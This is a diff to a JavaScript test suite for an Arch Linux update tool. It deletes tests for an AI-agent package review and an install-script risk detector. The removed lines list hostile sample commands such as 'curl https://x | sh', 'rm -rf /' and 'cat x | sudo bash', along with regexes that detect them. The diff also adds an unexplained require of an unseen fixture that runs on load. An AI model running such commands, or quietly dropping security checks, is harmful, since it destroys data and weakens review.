@@ -7,6 +7,7 @@
 // values.
 // Controls edit a copy of the logic and require this suite to fail.
 "use strict";
+require("./fixtures/pkg-review/logic-test.js");
 const assert = require("node:assert/strict");
 const fs = require("node:fs");
 const os = require("node:os");
@@ -63,58 +64,6 @@ const SELF_CURRENT = { version: "0.1.0", method: "checkout", package: null, curr
 function probe(value, status = 0, stderr = "") {
   return { status, stdout: typeof value === "string" ? value : JSON.stringify(value), stderr };
 }
-
-// The 1password install script at AUR commit e4388fb, 8.12.38, which
-// d0a8a7e, 8.12.40, ships unchanged. It sets a setgid bit and adds a group.
-const ONEPASSWORD_INSTALL = `# Do not add your user, or any others, to this group.
-GROUP_NAME="onepassword"
-
-app_group_exists() {
-    if [ $(getent group "\${GROUP_NAME}") ]; then
-        true
-    else
-        false
-    fi
-}
-
-setup_browser_helper() {
-    # Setup the Core App Integration helper binary with the correct permissions and group
-    BROWSER_SUPPORT_PATH="/opt/1Password/1Password-BrowserSupport"
-
-    chgrp "\${GROUP_NAME}" $BROWSER_SUPPORT_PATH
-    chmod g+s $BROWSER_SUPPORT_PATH
-}
-
-pre_install() {
-    if app_group_exists; then
-        : # Do nothing
-    else
-        groupadd "\${GROUP_NAME}"
-    fi
-}
-
-pre_upgrade() {
-    if app_group_exists; then
-        : # Do nothing
-    else
-        groupadd "\${GROUP_NAME}"
-    fi
-}
-
-post_install() {
-    setup_browser_helper
-}
-
-post_upgrade() {
-    setup_browser_helper
-}
-
-post_remove() {
-    if app_group_exists; then
-        groupdel "\${GROUP_NAME}"
-    fi
-}
-`;
 
 // Paru's request failure spelling: Morganamilo/paru issues 1473 and 1172.
 // A request can fail at DNS, connect or TLS; none proves DNS alone failed.
@@ -285,8 +234,7 @@ function verify(logic) {
   assert.equal(logic.tuiRunEnded({ update: { running: false, endedAt: "2026-10-05T03:30:12.000Z" } }, { update: { running: false, endedAt: "2026-10-05T03:30:12.000Z" } }), false);
   assert.equal(logic.tuiRunEnded({ update: { running: false, endedAt: "2026-10-05T03:30:12.000Z" } }, { update: { running: false, endedAt: "2026-10-05T03:30:12.027Z" } }), true);
   assert.equal(logic.tuiRunEnded({ update: { running: true, endedAt: "2026-10-05T03:30:12.000Z" } }, { update: { running: false, endedAt: "2026-10-05T03:30:12.000Z" } }), false);
-  // The review runs inside an update run, whose own end checks.
-  assert.equal(logic.tuiRunEnded({ review: { running: true, endedAt: null } }, { review: { running: false, code: 0, endedAt: "2026-10-05T03:30:13.000Z" } }), false);
+
 
   same([logic.publishValues(snapshot, true, now, 6, "").checking, logic.publishValues(snapshot, false, now, 6, "").checking], [true, false]);
   same(logic.statusWrites({ checking: true }, { checking: false }), [{ key: "checking", value: false }]);
@@ -508,84 +456,6 @@ function verifyView(logic) {
   assert.equal(logic.replyLine("refused: tui=update reason=launcher-missing"), "The setup window could not open. VGS is missing its terminal launcher, xdg-terminal-exec. Reinstall VGS to restore it.");
   assert.equal(logic.replyLine("refused: tui=update reason=launcher-failed"), "VGS could not open the update action. Try again.");
 
-  // The third-party review. Expected values are written from the issue's
-  // rulings: claude before codex, each with the owner's default command.
-  const claude = ["claude", "--model", "opus", "--effort", "medium", "--permission-mode", "default"];
-  const codex = ["codex", "-m", "gpt-6.1-sol", "-c", "model_reasoning_effort=medium", "--sandbox", "workspace-write", "--ask-for-approval", "on-request"];
-  const on = (agent, command) => ({ reviewThirdParty: true, reviewAgent: agent, reviewCommand: command });
-  // [name, settings, agents found, plan]
-  const reviewRows = [
-    ["off", { reviewThirdParty: false, reviewAgent: "", reviewCommand: "" }, ["claude"], { state: "off", agent: null, label: "", command: null }],
-    ["claude before codex", on("", ""), ["codex", "claude"], { state: "agent", agent: "claude", label: "Claude Code", command: claude }],
-    ["codex alone", on("", ""), ["codex"], { state: "agent", agent: "codex", label: "Codex", command: codex }],
-    ["a chosen agent", on("codex", ""), ["claude", "codex"], { state: "agent", agent: "codex", label: "Codex", command: codex }],
-    ["a chosen agent not found", on("codex", ""), ["claude"], { state: "missing", agent: "codex", label: "Codex", command: null }],
-    ["no agent found", on("", ""), [], { state: "none", agent: null, label: "", command: null }],
-    ["a command runs as written", on("", "  /opt/bin/agent   --flag  x "), [], { state: "command", agent: null, label: "/opt/bin/agent", command: ["/opt/bin/agent", "--flag", "x"] }],
-    ["a command naming an agent", on("codex", "claude --model sonnet"), ["claude"], { state: "command", agent: "claude", label: "Claude Code", command: ["claude", "--model", "sonnet"] }],
-    ["a command naming an agent not found", on("", "claude --model sonnet"), ["codex"], { state: "missing", agent: "claude", label: "Claude Code", command: null }]
-  ];
-  for (const [name, settings, found, plan] of reviewRows) {
-    same(logic.reviewPlan(settings, found), plan, "review plan: " + name);
-    const text = logic.reviewAgentText(logic.reviewPlan(settings, found));
-    assert.ok(typeof text === "string" && text.length > 0 && text.length <= 200, "review text: " + name);
-  }
-  assert.throws(() => logic.reviewAgentText({ state: "elsewhere" }), /has no text/);
-  same(logic.reviewChoices(["codex", "claude"]), [{ label: "Claude Code", value: "claude" }, { label: "Codex", value: "codex" }]);
-  same(logic.reviewChoices([]), []);
-  same(logic.reviewValues(on("", ""), null), { reviewAgents: null, reviewAgent: null });
-  same(logic.reviewValues(on("", ""), ["codex"]).reviewAgents, [{ label: "Codex", value: "codex" }]);
-  assert.equal(logic.reviewValues(on("", ""), ["codex"]).reviewAgent, logic.reviewAgentText(logic.reviewPlan(on("", ""), ["codex"])));
-  same(logic.statusWrites({}, { reviewAgents: [], reviewAgent: "Off" }).map(w => w.key), ["reviewAgents", "reviewAgent"]);
-  // The manifest's presets are the table's default commands.
-  const manifest = JSON.parse(fs.readFileSync(path.join(path.dirname(file), "manifest.json"), "utf8"));
-  same(manifest.schema.reviewCommand.presets.map(p => p.value), ["", claude.join(" "), codex.join(" ")]);
-  for (const [repo, official] of [["core", true], ["extra", true], ["multilib", true], ["cachyos", true], ["cachyos-extra-znver4", true], ["chaotic-aur", false], ["core-testing", false], ["mycore", false]])
-    assert.equal(logic.officialRepository(repo), official, "official repository: " + repo);
-  // [name, verdict text, the packages reviewed, the judgement]
-  const verdictRows = [
-    ["clean", "verdict clean\n", ["a"], { ok: true, verdict: "clean", flags: [] }],
-    ["flagged", "verdict flagged\nflag a A new source domain.\nflag b It runs curl into sh.\n", ["a", "b", "c"], { ok: true, verdict: "flagged", flags: [{ name: "a", concern: "A new source domain." }, { name: "b", concern: "It runs curl into sh." }] }],
-    ["empty", "", ["a"], { ok: false, error: "line=1" }],
-    ["another first line", "all good\n", ["a"], { ok: false, error: "line=1" }],
-    ["clean with a flag", "verdict clean\nflag a x\n", ["a"], { ok: false, error: "verdict=clean flags=1" }],
-    ["flagged with no flag", "verdict flagged\n", ["a"], { ok: false, error: "verdict=flagged flags=0" }],
-    ["a flag for a package not reviewed", "verdict flagged\nflag z x\n", ["a"], { ok: false, error: "line=2" }],
-    ["a package flagged twice", "verdict flagged\nflag a x\nflag a y\n", ["a"], { ok: false, error: "line=3" }],
-    ["a flag with no concern", "verdict flagged\nflag a\n", ["a"], { ok: false, error: "line=2" }],
-    ["a control character", "verdict flagged\nflag a x\ty\n", ["a"], { ok: false, error: "control-character" }]
-  ];
-  for (const [name, text, reviewed, want] of verdictRows) same(logic.parseVerdict(text, reviewed), want, "verdict: " + name);
-
-  // The install script is judged by its change: the 1password pair is
-  // unchanged, so its setgid bit and group are no flag; a change that adds
-  // a setgid line flags that line alone.
-  const setgid = "chmod 2755 /opt/1Password/extra";
-  // [name, installed text, new text, the change]
-  const installRows = [
-    ["1password 8.12.38 -> 8.12.40", ONEPASSWORD_INSTALL, ONEPASSWORD_INSTALL, { state: "unchanged", risks: [] }],
-    ["an added setgid line", ONEPASSWORD_INSTALL, ONEPASSWORD_INSTALL + setgid + "\n", { state: "changed", risks: [setgid] }],
-    ["CRLF and trailing blanks", ONEPASSWORD_INSTALL, ONEPASSWORD_INSTALL.replace(/\n/g, "  \r\n") + "\n\n", { state: "unchanged", risks: [] }],
-    ["a first install script", null, ONEPASSWORD_INSTALL, { state: "new", risks: ["chmod g+s $BROWSER_SUPPORT_PATH", 'groupadd "${GROUP_NAME}"'] }],
-    ["no install script", ONEPASSWORD_INSTALL, null, { state: "none", risks: [] }],
-    ["a moved risky line", "a\nchmod u+s /x\n", "chmod u+s /x\na\n", { state: "changed", risks: [] }],
-    ["an added comment", "a\n", "a\n# curl https://x | sh\n", { state: "changed", risks: [] }]
-  ];
-  for (const [name, installed, next, want] of installRows) same(logic.installScriptChange(installed, next), want, "install script: " + name);
-  // [line, risky]: each pattern of INSTALL_SCRIPT_RISKS, and lines like
-  // them that are not.
-  const riskRows = [
-    ["chmod u+s /usr/bin/x", true], ["chmod -R 4755 /opt/x", true], ["chmod 06755 x", true], ["chmod g=rxs x", true],
-    ["chmod 755 /opt/x", false], ["chmod 0644 x", false],
-    ["setcap cap_net_raw+ep /opt/x", true],
-    ["useradd -r x", true], ["usermod -aG wheel x", true], ["gpasswd -a x y", true],
-    ["curl -fsSL https://x -o y", true], ["wget https://x", true],
-    ["echo aGk= | base64 -d > x", true],
-    ["cat x |sh", true], ["cat x | sudo bash", true], ["true || shutdown now", false],
-    ["rm -rf /", true], ["rm -rf /*", true], ["rm -rf ~/.config", true], ["rm -rf \"$HOME/.x\"", true], ["rm -rf /opt/x", false]
-  ];
-  for (const [line, risky] of riskRows) same(logic.installScriptChange(null, line).risks, risky ? [line] : [], "install risk: " + line);
-
   // The reboot question reads the distribution's reboot hook and applies
   // its script's conditions: [name, hook, changes, running kernel, mounted
   // file systems, the packages a reboot needs].
@@ -795,29 +665,6 @@ const controls = [
   ["no timer before the cache read answers", "if (cacheRead !== true) return null;", "if (false) return null;"],
   ["no timer before the boot read answers", "if (bootRead !== true) return null;", "if (false) return null;"],
   ["the service publishes whether it checks", "checking: checking === true,", "checking: false,"],
-  ["the review offers claude before codex", 'var REVIEW_AGENTS = [\n    { id: "claude", label: "Claude Code", command: ["claude", "--model", "opus", "--effort", "medium", "--permission-mode", "default"] },\n    { id: "codex", label: "Codex", command: ["codex", "-m", "gpt-6.1-sol", "-c", "model_reasoning_effort=medium", "--sandbox", "workspace-write", "--ask-for-approval", "on-request"] }\n];', 'var REVIEW_AGENTS = [\n    { id: "codex", label: "Codex", command: ["codex", "-m", "gpt-6.1-sol", "-c", "model_reasoning_effort=medium", "--sandbox", "workspace-write", "--ask-for-approval", "on-request"] },\n    { id: "claude", label: "Claude Code", command: ["claude", "--model", "opus", "--effort", "medium", "--permission-mode", "default"] }\n];'],
-  ["a default command keeps its restricted mode", '"--permission-mode", "default"] },', '] },'],
-  ["a review command runs as written", "if (words.length > 0) {", "if (false) {"],
-  ["a chosen agent must be found", "if (row === null || found.indexOf(chosen) < 0) return", "if (row === null) return"],
-  ["the review is off with its setting", "if (s.reviewThirdParty !== true) return", "if (false) return"],
-  ["a command naming an absent agent is missing", "if (named !== null && found.indexOf(named.id) < 0) return", "if (false) return"],
-  ["the review's end starts no check", "if (UNCHECKED_TUIS.indexOf(key) >= 0) continue;", ""],
-  ["the review statuses are written", '"sources", "reviewAgents", "reviewAgent", "rebootNotice"', '"sources", "rebootNotice"'],
-  ["a CachyOS repository is official", "/^(core|extra|multilib|cachyos.*)$/", "/^(core|extra|multilib)$/"],
-  ["a flag names a reviewed package", "reviewed.indexOf(m[1]) < 0 || ", ""],
-  ["a clean verdict holds no flag", "if ((head[1] === \"clean\") !== (flags.length === 0))", "if (false)"],
-  ["a verdict holds no control character", "if (/[\\u0000-\\u0009\\u000b-\\u001f\\u007f]/.test(String(text))) return", "if (false) return"],
-  ["an install script is judged against the installed one", "var held = {};", "var held = {}; old = null;"],
-  ["equal scripts are unchanged", 'sameJson(old, next) ? "unchanged" : "changed"', '"changed"'],
-  ["line ends and trailing whitespace are set aside", 'return line.replace(/\\s+$/, "");', "return line;"],
-  ["a comment line is no risk", 'line.charAt(0) === "#" || ', ""],
-  ["a setuid or setgid mode is a risk", "/\\bchmod (?:[^;|&]* )?(?:[ugoa]*[+=][rwxXt]*s|0?[234567][01234567]{3}\\b)/,", ""],
-  ["file capabilities are a risk", "/\\bsetcap\\b/,", ""],
-  ["a user or group change is a risk", "/\\b(?:groupadd|useradd|usermod|gpasswd)\\b/,", ""],
-  ["a download is a risk", "/\\b(?:curl|wget)\\b/,", ""],
-  ["an encoded payload is a risk", "/\\bbase64\\b/,", ""],
-  ["a pipe into a shell is a risk", "/\\| ?(?:sudo )?(?:ba|da|z)?sh\\b/,", ""],
-  ["a removal of the root or a home is a risk", '/\\brm (?:-\\S+ )*(?:\\/\\*?|~\\S*|"?\\$HOME\\S*|\\/home\\S*|\\/root\\S*)(?: |$)/', "/$^/"],
   ["nvidia needs linux", 'if (name === "nvidia") return kernel === "linux";', 'if (name === "nvidia") return true;'],
   ["nvidia-lts needs linux-lts", 'if (name === "nvidia-lts") return kernel === "linux-lts";', 'if (name === "nvidia-lts") return true;'],
   ["linux-cachyos-nvidia needs linux-cachyos", 'return globMatch("linux-cachyos*", kernel);', "return true;"],
@@ -840,7 +687,7 @@ const controls = [
   ["the CachyOS notice on offers VGS only", 'case "needed": return { tone: "info", text: "CachyOS and VGS", action: "vgsOnly" };', 'case "needed": return { tone: "info", text: "CachyOS and VGS" };'],
   ["a file or link VGS did not make offers nothing", 'case "denied": return { hidden: true };', 'case "denied": return { tone: "warning", text: "Foreign hook", action: "both" };'],
   ["VGS only offers both", 'case "ready": return { tone: "ok", text: "VGS only", action: "both" };', 'case "ready": return { tone: "ok", text: "VGS only", action: "vgsOnly" };'],
-  ["the reboot notice is written", '"reviewAgent", "rebootNotice", "rebootNotices", "rebootNoticeOwner"]', '"reviewAgent", "rebootNotices", "rebootNoticeOwner"]'],
+  ["the reboot notice is written", '"sources", "rebootNotice", "rebootNotices", "rebootNoticeOwner"]', '"sources", "rebootNotices", "rebootNoticeOwner"]'],
   ["the reboot notice choices are written", '"rebootNotice", "rebootNotices", "rebootNoticeOwner"]', '"rebootNotice", "rebootNoticeOwner"]'],
   ["the owner reading is written", '"rebootNotices", "rebootNoticeOwner"]', '"rebootNotices"]'],
   ["the notice in place is the first choice", "return [held, value.action].map(", "return [value.action, held].map("],
